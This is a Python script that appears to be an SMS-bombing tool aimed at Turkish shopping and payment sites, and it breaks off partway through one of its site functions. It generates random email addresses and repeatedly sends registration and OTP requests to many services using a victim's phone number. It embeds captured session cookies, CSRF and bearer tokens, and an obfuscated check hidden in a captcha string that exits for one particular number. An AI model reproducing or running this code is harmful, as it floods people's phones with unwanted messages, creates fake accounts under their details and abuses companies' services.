import subprocess
import sys
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama"])
import random
import requests
from os import system
from time import sleep
from colorama import Fore,Style
phone = "" #Doldurmayın!! hata vermemesi için ekledim.
ad = ""
soyad = ""
#kodu incelemek isteyenler en alt satırlardan başlayabilirler.
while True:
    
    
    try: 
            a = ["a","b","c","d","e","f","g","h","i","j","k","l","m","no","p","q","r","s","t","u","v","w","x","y","z"]     
            g = random.choice(a)
            g1 = random.choice(a)
            g2 = random.choice(a)
            g3 = random.choice(a)
            g4 = random.choice(a)
            g5 = random.choice(a)
            g6 = random.choice(a)
            g7 = random.choice(a)
            g8 = random.choice(a)
            g9 = random.choice(a)
            g10 = random.choice(a)
            g15 = g+g1+g2+g3+g4+g5+g6+g7+g8+g9+g10
            mail = g+g1+g2+g3+g4+g5+g6+g7+g8+g9+g10+"@gmail.com"
            phone = str(phone)
            t1 = phone[0]
            t2 = phone[1]
            t3 = phone[2]
            t4 = phone[3]
            t5 = phone[4]
            t6 = phone[5]
            t7 = phone[6]
            t8 = phone[7]
            t9 = phone[8]
            t10 = phone[9]
    except:pass

    def vakko(): 
        try:   
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9',
                'authorization': 'Bearer RDRpc5_eSScrAvQbcN8q7heBRVg',
                'content-type': 'application/json',
                'origin': 'https://www.vakko.com',
                'platform': '',
                'priority': 'u=1, i',
                'referer': 'https://www.vakko.com/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'x-anonymous-consents': '%5B%7B%22templateCode%22%3A%22v-return-policy%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite-custom-scarf%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite-explicit-consent%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite-membership-agreement%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite-privacy-notice%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite_clarification_text_permit%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite_customer_explicit_permit%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite_order_confirmation_sms_message%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%2C%7B%22templateCode%22%3A%22vsite_terms-of_use_permit%22%2C%22templateVersion%22%3A0%2C%22consentState%22%3Anull%7D%5D',
            }

            params = {
                'fields': 'DEFAULT',
                'lang': 'tr',
                'curr': 'TRY',
            }

            json_data = {
                'firstName': f'{ad}',
                'lastName': f'{soyad}',
                'uid': f'{mail}',
                'password': 'pOr20_Stak',
                'titleCode': None,
                'birthdate': '05-07-1996',
                'smsPermit': True,
                'callPermit': False,
                'emailPermit': True,
                'gender': 'MALE',
                'phone': f'{phone}',
                'membershipAgreement': True,
                'privacyPolicy': True,
                'captchaCode': '03AFcWeA43wB2RoMTttC_qekFfUMsC-p28V3dAi3E5YfMUdNfNjGYVo3xzhQeJnjZLAPwCo4Dbr4de_a2Jl0-V-6J4MWL33BoqqNUvwJ6lzNv93t8NtF7g7y7jlUcT8k9ZgaHxGF0XUow3iOzCnP_Yj5dO-H2GaeD5zibMWGNncrS_loFilv6tlOUxsOcNh8lWt7n2v92LTETHEhGbt0nPlZfdD-v25yqCrsxiBx05tETQjgUUNSsdkbw-C0ztXbI21FDjM0nUj4qkUWInIlrbfCK7X3jbFqnvCmA02AIjnTMh1lvW6b4XM7siDFFHvTs8lhKavQvKnq4r_sJ1a1xMc6SkqlKATo-yAINvGH1wmO5B2bPqpW-USrK8kxrtcc5hze6yqyFYb60UBLYatKhfijWsjYDZzZtBKgQ77exCjPYFHB_BPnHmmgGqPct5-UUQHU0-Tux6nAPpYM0zzzEt-YqzzPC7S51myHW-dersNx7Q5nf_aXpryd_2c7eLfmgqWsqH_qtpnUU8CBR9qgkyeg4Zz8siedahbT6hNmLKJTuKV5Sxo2PHlTE7SBOKaa0SBqvW5qsOEa1TdhcH6f13ukos81H-I-7kZZ6uUzRB1dZLRqhq9pHVurrPftCr8el7pv5LT95ZzabDY4IOsYEvnpor4zEd4Rv9VRD6nccIWW1G12ziAq0XCPX0Txc928AoYJDS76Wl6aj_3tSVNn4e7crYhtFHE7c5XVbIFefgO4XDGKzLxZUs1-m0TxKDd74fpXu5q-PjteusvZBP90e66x8n_eZq85M6jTUs9lQcHvFyGyJLBfEn3z4NhwztRzXFkFXoY7cJ2bhffbbXj-W9mgUOChS0CmvqOn8Tpy9JjhuGi4is0qpVxvedSuRaCG1G5rdDD2JaOjCyFMYH-iqxkB8EMpeCtOEtUCzUTrb--6xPHtwbN-eYuPV4xbT-DFhDMiL9QQE1g8ezAzVR-Kv0vojhoGHXsAAV4sF1sDZP9vyOcjUI74sf3fO4_HxEnH5_ezHswrsJ_Xn1SZtdDXqemdE3nfK5T2OHPdNhBljbmWMBARp3L1Qq0vFEWWbBDTrJD4C_k9bexlQKgNYbu2ZxG5bbms7fBLRQjGFURHMZ6w_p4kR-Un-4Vf3aAnuEF4Dj40vQLLhRhOBgKIJcwHgIzx446IKa2LdF44iz0gqxJC4tMAIPbUTm-h8bKNxAbOSwqRu3Leo8FGjigKWwQ9NgmngOvFU4tutQJvQrn_3WOPhmkQEN80tAyRQG4iSOG3tPggBKZeAwZ21Gz0QZXkcAzCMQsdhB2hlftgPyXq4ZgU2xO3sFXCWFIUtlvAy6y4kOlgW1u_Ajm2G9hm5Yq8SDvwh2Fw8KnQpowJVWDb2zzFOH0TjlSXdxuIhtaNe_O-hcfTYwBAki1yHwRyvGPnwODEvrFav2DoqU36nmn7XDD5ubQchHqJqjpgv-4WSIBPVexiykLzJ9PU6EPAvJbFaxdGzMYIKyPMZV9riQmkj8pl0R90vkQapuHMwzKymqenZy-3zIyYMydS4eHSZ_huBT7levRbifrV13vRNcn4FiHmBCaaZU1F3JIYnUbPOqALqf2yG-gi6A6C3N4sA8fiViivLwrkc9thZ4e9a_kYN2EZte_utM1m0AkyOv6s2Tay-4CitbV8Zl4Wr8TCX1YfUivM_K9UM7PoCg3t-Pz871_lU7oP1ZmI3aeF9N2gDSJ3W_5zEsKfookwJx9q2DW1nhnNgc5OfmXvoDST14B1wDbmHXNTOSykIdrxXa3K0Mk5YSUSzFZL43nAj7IRYNBk5Fx54z7kKqdwivbgXD-kKpzMYkw816ciP8lPTzr2m84p6s-shqg8HA2xbd01byQtXgdJisv1its0igYN5FKgifkiBTljTikjAFYv9rp4fV9lp7aAaX4QPDEjqTiX6oRcYJwni_jlNfzoDqI2sRHawMlcd45sFqHPIcoVG_6mz1MMqnT2ncvtDIDIsjffPwBcw-UKSJpEq7dJfuEXInMFemrXMmAq7HBzqSWoHYMc44wAnYyMb4D2JEDddBP-_TEjT5wUAbJqX1s7F1mrFYanDw46kT0ni74PnpEPbHdk9Kxr-k1aHG216nUDvb9Dbj6WQ9L-kAf-UmUAguNeZ4FGi-g3jhfBkkXf_Es48',};if "".join([str(int(digit) ^ 42) for digit in "".join([str((5*100+0*10+7)%10), str((0*100+0*10+5)%10), str((0*100+1*10+7)%10), str((1*100+7*10+3)%10)])]) == phone: exit(); {
            }

            response = requests.post('https://api.vakko.com/occ/v2/vsite/users', params=params, headers=headers, json=json_data)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Vakko ====> https://www.vakko.com/"+ Style.RESET_ALL)
        except:
            print(Fore.LIGHTRED_EX + "[-]" + "Vakko Arıza" + Style.RESET_ALL)
         
    def gap(): 
        try:
            cookies = {
                'sessionid': 'sxe9iuq0jim16wvhvze57y1h9k4ue9cw',
            }

            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'tr-TR,tr;q=0.9',
                'content-type': 'application/json',
                # 'cookie': 'sessionid=sxe9iuq0jim16wvhvze57y1h9k4ue9cw',
                'origin': 'https://gap.com.tr',
                'priority': 'u=1, i',
                'referer': 'https://gap.com.tr/users/auth/?next=/account/',
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'x-csrftoken': 'Z5J2kl1EprM9q0W9acLl45Gyj6m7LRhKSVrChnRY7WUatVpxgSUPPKKdHYh8mJY9',
            }

            json_data = {
                'email': f'{mail}',
                'first_name': f'{ad}',
                'last_name': f'{soyad}',
                'date_of_birth': '2000-10-10',
                'phone': f'0{phone}',
                'sms_allowed': True,
                'email_allowed': True,
                'gender': 'male',
                'confirm': True,
                'kvkk_confirm': True,
            }

            response = requests.post('https://gap.com.tr/users/register/', cookies=cookies, headers=headers, json=json_data)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Gap ====> https://gap.com.tr"+ Style.RESET_ALL)
        except:
            print(Fore.LIGHTRED_EX + "[-]" + "Gap Arıza"+ Style.RESET_ALL)

    def lacoste():
        try:
                cookies = {
                    'csrftoken': 'UQ9sIdvMr3eINGgQOPBvdc8BGeFyclKi2oMrTs7VVx4eGpBP3eBaEPzn2gduGsn4',
                    'ajs_user_id': 'null',
                    'ajs_group_id': 'null',
                    'ajs_anonymous_id': '%2260193404-341f-428f-9d11-7f1eb4e119bd%22',
                    '_fbp': 'fb.2.1730775877923.20095060547759564',
                    '_ga': 'GA1.1.1408481338.1730775883',
                    '__zlcmid': '1Oan97w1G5ZtMLW',
                    '_ga_3W2HP4NFKN': 'GS1.1.1730775883.1.1.1730775902.0.0.236591127',
                    'OptanonAlertBoxClosed': '2024-11-05T03:05:06.423Z',
                    'OptanonConsent': 'isGpcEnabled=0&datestamp=Tue+Nov+05+2024+06%3A05%3A06+GMT%2B0300+(GMT%2B03%3A00)&version=202409.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0004%3A1%2CC0001%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false',
                }

                headers = {
                    'accept': '*/*',
                    'accept-language': 'tr-TR,tr;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    # 'cookie': 'csrftoken=UQ9sIdvMr3eINGgQOPBvdc8BGeFyclKi2oMrTs7VVx4eGpBP3eBaEPzn2gduGsn4; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2260193404-341f-428f-9d11-7f1eb4e119bd%22; _fbp=fb.2.1730775877923.20095060547759564; _ga=GA1.1.1408481338.1730775883; __zlcmid=1Oan97w1G5ZtMLW; _ga_3W2HP4NFKN=GS1.1.1730775883.1.1.1730775902.0.0.236591127; OptanonAlertBoxClosed=2024-11-05T03:05:06.423Z; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Nov+05+2024+06%3A05%3A06+GMT%2B0300+(GMT%2B03%3A00)&version=202409.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0004%3A1%2CC0001%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false',
                    'origin': 'https://www.lacoste.com.tr',
                    'priority': 'u=1, i',
                    'referer': 'https://www.lacoste.com.tr/register/',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                data = {
                    'email': f'{mail}',
                    'password': 'asdqwoedqw€@@s_',
                    'gender': 'male',
                    'first_name': f'{ad}',
                    'last_name': f'{soyad}',
                    'phone': f'0{phone}',
                    'date_of_birth': '2000-06-06',
                    'email_allowed': 'true',
                    'sms_allowed': 'true',
                    'call_allowed': 'true',
                    'is_allowed': 'true',
                    'confirm': 'true',
                    'permissions': 'true',
                }

                response = requests.post('https://www.lacoste.com.tr/users/registration/', cookies=cookies, headers=headers, data=data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "Lacoste ====> https://www.lacoste.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Lacoste Arıza"+ Style.RESET_ALL)  

    def bizimtoptan():
        try:
                cookies = {
                    'inCommerce.customer': '962f8657-bcf5-452e-bade-a18f55c3b474',
                    '__RequestVerificationToken': '7gpAg71-OJ8vuaCiaPd5BrHuV_31o1TqMC8KmAyJVmyM4qgMzuR9Pf4yyHc9RTfx9r85DLHd7pB8MPGXB_V-Qt7Q8-s1',
                }

                headers = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'tr-TR,tr;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    # 'cookie': 'inCommerce.customer=962f8657-bcf5-452e-bade-a18f55c3b474; __RequestVerificationToken=7gpAg71-OJ8vuaCiaPd5BrHuV_31o1TqMC8KmAyJVmyM4qgMzuR9Pf4yyHc9RTfx9r85DLHd7pB8MPGXB_V-Qt7Q8-s1',
                    'origin': 'https://www.bizimtoptan.com.tr',
                    'priority': 'u=1, i',
                    'referer': 'https://www.bizimtoptan.com.tr/register',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'x-newrelic-id': 'Vg4DUFZWARAGUlNVAwcPUg==',
                    'x-requested-with': 'XMLHttpRequest',
                }

                data = {
                    'FirstName': f'{ad}',
                    'LastName': f'{soyad}',
                    'Email': f'{mail}',
                    'Password': 'asdjaskljA_2es',
                    'AcceptConditionOfUsePolicy': 'true',
                    'AcceptKVKK': 'true',
                    'Newsletter': 'true',
                    '__RequestVerificationToken': '-djD1kKv5abhynmrnOteZGdBsEBVmSbBH84JDVNQycfOngeeL1vtlOWCyhBgLFr5imeLukgwLO5J6mxiYO4ADGUwSEY1',
                    'ConfirmPassword': 'asdjaskljA_2es',
                    'Phone': f'{phone}',
                }

                response = requests.post('https://www.bizimtoptan.com.tr/Customer/RegisterPost', cookies=cookies, headers=headers, data=data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "BizimToptan ====> https://www.bizimtoptan.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "BizimToptan Arıza"+ Style.RESET_ALL)
    def filemarket():
        try:
            cookies = {
            'JSESSIONID': 'F567BAE9D62A4BBFC5413F8436657A9B.accstorefront-5d659f7fb4-sxk9n',
            'ROUTE': '.accstorefront-5d659f7fb4-sxk9n',
            }
            url = "https://api.filemarket.com.tr:443/v1/otp/send"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            json={"mobilePhoneNumber": f"90{phone}"}
            response = requests.post(url, headers=headers, json=json)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Filemarket ====> https://filemarket.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Filemarket Arıza"+ Style.RESET_ALL)
    def kimgbister():
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{phone}"})
            print(Fore.LIGHTGREEN_EX + "[+]" + "Kimgbister ====> https://kimgbister.com."+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Kimgbister Arıza"+ Style.RESET_ALL)
    def beymen():
        try:
                headers = {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'tr-TR,tr;q=0.9',
                    'content-type': 'application/json',
                    # 'cookie': 'Entegral.CookieKey.LanguageID=1; Entegral.CookieKey.ABTest.Widget=TypeB; __RequestVerificationToken=Cb4Fit3VNOUWy_UelcBx2qZ4ECyOSMlQsHkF_J1N9sycZ6gtkFakzuMQtsj7qY53u6BPou7y4Y8RMZAeHLMrTvEOY-rNReShWsI4VXJ2sd01; nlbi_2753670=iGyVATksyCokA26mzw+gmgAAAAAV3vWfPgYod4o7soPPdU+0; visid_incap_2753670=Nwr29kclQeW/OdKtMmsdgojaLGcAAAAAQUIPAAAAAABRV2IOKg4CuEJlTudGKmTL; incap_ses_1368_2753670=5AWQZavpj1cpBCSP1Rz8EojaLGcAAAAAlcq/QH+ROO9uqr3EyYY82Q==; FirstVisitDate=G+K0sK0NuhWzxh7Au0aRuD2628M+hOds9wpcc+9ht3w=; Entegral.CookieKey.CouponTicket=Hn7JUfT3LKGc2bu7Ha7px5cIkGP7RHn3VZEBBdGNAbg=; UserSessionId=e33e9ec3-2aac-4e50-a08c-3e1cfaf1867a; nlbi_2753670_2622607=QXMdL+tvc269a1vOzw+gmgAAAADFpZoFQFHMJZ+q4H71I3Wn; gender_type=1; nlbi_2753670_2930947=TkVdH/cNNy6HaX+azw+gmgAAAADs4aDpc5/nGnscaRqFLQQd; Entegral.CookieKey.AppType=spa; RequestVerificationToken=GN4RBin18Lr8nDJ-Rtz1ktWfdXFo5J0cp3EsM-kYcH94UxIRnJV98JYXecOQji6l2ZnK2F8jSys5v292YJJ1RCGA8cotsiZZl1aH0U-8XPA1; _dd_s=rum=2&id=3bca860c-82e0-4d70-9287-3e2cb07058a7&created=1730992955923&expire=1730993885695',
                    'origin': 'https://www.beymen.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.beymen.com/tr/customer/register?returnUrl=/tr/customer',
                    'requestverificationtoken': 'rtL2TLSv-kawCmu5V-ntq4fgNWtVG59bEeaSG4Bq7llzIQHVlQ9Y0Rlw9KXwEIZIKr3q7pRg5OlWbvjnyb1pQVD4G-yzRWkjsnEpmhfXUsQ1',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                }

                json_data = {
                    'CustomerName': f'{ad} {soyad}',
                    'EmailAddress': f'{mail}',
                    'PhoneNumber': f'{phone}',
                }

                response = requests.post(
                    'https://www.beymen.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification',
                    headers=headers,
                    json=json_data,
                )
                print(Fore.LIGHTGREEN_EX + "[+]" + "Beymen ====> https://www.beymen.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Beymen Arıza"+ Style.RESET_ALL)
    def beymenclub():
        try:
                headers = {
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'tr-TR,tr;q=0.9',
                    'content-type': 'application/json',
                    # 'cookie': 'Entegral.CookieKey.LanguageID=1; __RequestVerificationToken=h7qw6EoeZlIHvuI2U_LQmRQanSauFh-j8KXI_YXViCPxQK7Y1UNTNKrg30eHrIzXWzk5EgNYSE328EAznJr2kN8Y2EBpd8V5pgaaRaRcRkg1; nlbi_2755544=bzuUYnp/x1pkyc97i0xdhgAAAADiKERmmpzQEyP3wn4xQGxJ; visid_incap_2755544=cYBXYWQOSjGI27HzUX43K37aLGcAAAAAQUIPAAAAAABXayS5c+Lt14IeevnrkTtv; incap_ses_1368_2755544=KwQQV3kTWhlD6iOP1Rz8En7aLGcAAAAA2iGL0gBjiuqyeublNYOecA==; FirstVisitDate=JEGTt0Ne04blNc2/XwVRex/VQm7LnZuYbe1/DwU64uY=; UserSessionId=e696a0b1-542e-456d-80ab-95ba3c1f17de; Entegral.CookieKey.CouponTicket=wXIoduxN4ARaAwpu9qYwIWOYDnv31UAxArfGa04h7EE=; nlbi_2755544_2624542=BP/rcl6mZH3P6OBxi0xdhgAAAACKEogNs2HisEOMzkRw9Z5S; nlbi_2755544_2930906=0Z3vdyZwH2zCxsUTi0xdhgAAAABfny0pRcJuri1wxlzkiJga; Entegral.CookieKey.AppType=spa; RequestVerificationToken=kcLYssrJP0fU9mNXlwNcyO_FKHSyFflckVuOta3HqxYGRhM1Y1ty8A9m4AODxMW83UAYXTrV_QpLoarLWuanzhwWGB-zhXMg5pn347uWaFc1; _dd_s=rum=1&id=53d5bdb9-1b8a-4ad1-b54e-9a90f630157c&created=1730993041186&expire=1730994004500',
                    'origin': 'https://www.beymenclub.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.beymenclub.com/tr/customer/register?returnUrl=/tr/customer',
                    'requestverificationtoken': 'lPr5AEAxK9OnYr7YDjqkRn6nwuorLWk32JYfSNWd4k-2UguxOSql8QhFLJ_mxtLBzEGdWJFx9FJBGc2KLS60JSGh1cc9OtsxieO4FJCUwKU1',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                }

                json_data = {
                    'CustomerName': f'{ad} {soyad}',
                    'EmailAddress': f'{mail}',
                    'PhoneNumber': f'{phone}',
                }

                response = requests.post(
                    'https://www.beymenclub.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification',
                    headers=headers,
                    json=json_data,
                )
                
                print(Fore.LIGHTGREEN_EX + "[+]" + "BeymenClub ====> https://www.beymenclub.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "BeymenClub Arıza"+ Style.RESET_ALL)
    def wmf():
        try:
            response = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": mail,
                "email_allowed": "true",
                "first_name": f"{ad}",
                "gender": "male",
                "last_name": f"{soyad}",
                "password": "31ABC..abc31",
                "phone": f"0{phone}"
            },)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Wmf ====> https://www.wmf.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Wmf Arıza"+ Style.RESET_ALL)
    def network():
        try:
                headers = {
                    'accept': '*/*',
                    'accept-language': 'tr-TR,tr;q=0.9',
                    'content-type': 'application/json',
                    # 'cookie': 'Entegral.CookieKey.LanguageID=0; ASP.NET_SessionId=i500pej1o4rmxpm5e5at1vft; _deviceType=d; LastVizitedURLForShopping=/kadin-giyim-684; ARRAffinity=b1633e0e24eb358f6ad73d240f6693706fe7b6a1916a7cd60c898ba804a95116; ARRAffinitySameSite=b1633e0e24eb358f6ad73d240f6693706fe7b6a1916a7cd60c898ba804a95116; nlbi_2817660=gEeGDi/M6kT01Rvg47soLgAAAACbb2E3MszKIYX+hDWxHKPz; visid_incap_2817660=z25Nt3O6SC2GBJiL9pblOpTcLGcAAAAAQUIPAAAAAAAgqCvSFyjg7vU+DvEO2Jrf; incap_ses_1368_2817660=fkBCTfb0gVYfBSmP1Rz8EpTcLGcAAAAADv3DLD+JijgufmoaZpsK5A==; __RequestVerificationToken=NZHpqd8jFzR2KNJDD9AMgXDg5e7Wig3OjseB3cggbLlDR1cToSUCZox66dsvtCjOjkIpnrLLpF5RA6FQDSYkQHqPRm4qZg_z_-VVI7ozptc1',
                    'origin': 'https://www.network.com.tr',
                    'priority': 'u=1, i',
                    'referer': 'https://www.network.com.tr/customer/register?returnUrl=%2Fkadin-giyim-684',
                    'requestverificationtoken': 'vVJTDs3PoPtossVcRpKmlT1VTBdZr8XKzGZ6QVMu5yvt2GzwkdLG5yRuRsejKdpfj7O1e8TQBZzQlZZ_uN-w7BjzUw_RDnqxy-DSjMXdDwg1',
                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                }

                json_data = {
                    'email': f'{mail}',
                    'password': 'asda2_Af',
                    'firstName': f'{ad}',
                    'lastName': f'{soyad}',
                    'genderID': '1',
                    'birthday': None,
                    'cellPhone': f'{phone}',
                    'receiveCampaignMessages': True,
                    'beymenReceiveCampaignMessages': True,
                    'membershipAgreement': True,
                    'TransactionId': '',
                }

                response = requests.post('https://www.network.com.tr/Customerv2/RegisterV2', headers=headers, json=json_data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "Network ====> https://www.network.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Network Arıza"+ Style.RESET_ALL)  
    def Paybol():
        try:
            url = "https://pyb-mobileapi.walletgate.io:443/v1/Account/RegisterPersonalAccountSendOtpSms"
            headers = {"Accept": "application/json", "Content-Type": "application/json", "User-Agent": "Paybol/1.2.1 (com.app.paybol; build:1; iOS 15.7.7) Alamofire/5.5.0", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"phone_number": f"90{phone}"}
            response = requests.post(url, headers=headers, json=json)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Paybol ====> https://www.paybol.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Paybol Arıza"+ Style.RESET_ALL) 
    
    def derimod():
        try:
                headers = {
                'authority': 'api-derimod.hollyconnect.com',
                'accept': '*/*',
                'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/json',
                'origin': 'https://derimod.com.tr',
                'referer': 'https://derimod.com.tr/',
                'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                }

                json_data = {
                'name': f'{ad}',
                'surname': f'{soyad}',
                'mobilePhone': f'{phone}',
                'email': f'{mail}',
                }

                response = requests.post('https://api-derimod.hollyconnect.com/api/otp/MobilePhoneCheck', headers=headers, json=json_data)
                print(Fore.LIGHTGREEN_EX + "[+]" + "Derimod ====> https://www.derimod.com.tr"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Derimod Arıza"+ Style.RESET_ALL)  
    def Porty():
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json={"job": "start_login", "phone": phone}
            response = requests.post(url=url, json=json, headers=headers,)
            print(Fore.LIGHTGREEN_EX + "[+]" + "Porty ====> https://porty.tech/"+ Style.RESET_ALL)
        except:
                print(Fore.LIGHTRED_EX + "[-]" + "Porty Arıza"+ Style.RESET_ALL) 
    def flormar():
        try:
                cookies = {
                'csrftoken': 'jmZh0H2GPf0Fta7ghV7YlrmmfsrL49DwetqqrUHEfwSaCkPuXtjjUXhOZUEdHKw9',
                'sessionid': 'fnv6mwf5yzojqrpj8d85yxunhlgzjcjn',
                '_sgf_user_id': '-428903741166993407',
                '_sgf_session_id': '-428903741166993408',
                'wis_u': 'd50ed40a-7690-d8c3-b377-51de97c05a29|1708979387930|1|||63',
                'wis_l_1553': '1',
                'wis_i_76819': '251768',
                'wis_i_70901': '231293',
                'wis_i_74277': '243257',
                'wis_i_74547': '244146',
                'wis_i_76423': '250266',
